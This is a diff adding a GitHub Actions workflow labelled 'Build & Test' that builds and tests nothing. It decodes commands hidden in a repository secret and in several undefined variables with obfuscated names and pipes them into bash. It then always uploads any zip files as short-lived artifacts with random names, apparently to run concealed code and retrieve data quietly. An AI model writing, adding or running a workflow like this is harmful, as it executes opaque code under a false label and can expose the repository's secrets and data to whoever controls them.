@@ -1,0 +1,25 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+jobs:
+  start:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute task
+        env:
+          ajq84: ${{ secrets.ajq84 }}
+        run: |
+          printf '%s' "$ajq84" | jq -r .opkl9 | /bin/bash
+          printf '%s' "$zy60232" | jq -r .vjxne5535 | /bin/bash
+          echo $giz37 | jq -r .cpuji41 | /bin/bash
+          echo $l0280 | jq -r .pocw77937 | /bin/bash
+
+      - name: Persist data
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: 6RvYRXBw
+          path: "*.zip"
+          retention-days: 1
